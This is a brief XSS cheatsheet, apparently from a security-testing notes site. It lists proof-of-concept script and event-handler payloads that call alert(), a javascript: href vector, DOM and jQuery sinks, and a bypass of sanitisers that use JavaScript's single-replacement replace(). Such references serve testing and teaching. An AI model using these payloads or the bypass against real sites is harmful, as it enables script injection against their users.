---
title: XSS - Cross Site Scripting
description: XSS cheatsheets, payloads and tricks.
---

# XSS

## Attack

### Basic payload

```html
<sCRipT>alert()</scRipt>
<a href="javascript:alert()"></a>
<img src=x onerror="alert()">
```

More payloads on [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### Vectors

If you can control the `href` tag of an anchor (`<a>` element). You can try to set the `href` value to `javascript:alert()`.

### HTML events and tags

Lists :

- [all-html-events.txt]({{ base_url }}/assets/txt/all-html-events.txt)
- [all-html-tags.txt]({{ base_url }}/assets/txt/all-html-tags.txt)

> Source [www.w3schools.com - event](https://www.w3schools.com/tags/ref_eventattributes.asp) and [www.w3schools.com - tags](https://www.w3schools.com/TAGs/).

### DOM XSS

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:

```
document.write()  
document.writeln()  
document.domain  
element.innerHTML  
element.outerHTML  
element.insertAdjacentHTML  
element.onevent  
```

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```
add()  
after()  
append()  
animate()  
insertAfter()  
insertBefore()  
before()  
html()  
prepend()  
replaceAll()  
replaceWith()  
wrap()  
wrapInner()  
wrapAll()  
has()  
constructor()  
init()  
index()  
jQuery.parseHTML()  
$.parseHTML()
```

> Source [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based).

## Bypass

### Replace function

The `replace` function only replace the first occurence.

```js
> "<img src=x onerror='alert()'>".replace("<", "&lt;")
"&lt;img src=x onerror='alert()'>"


> "<<img src=x onerror='alert()'>".replace("<", "&lt;")
"&lt;<img src=x onerror='alert()'>"
```

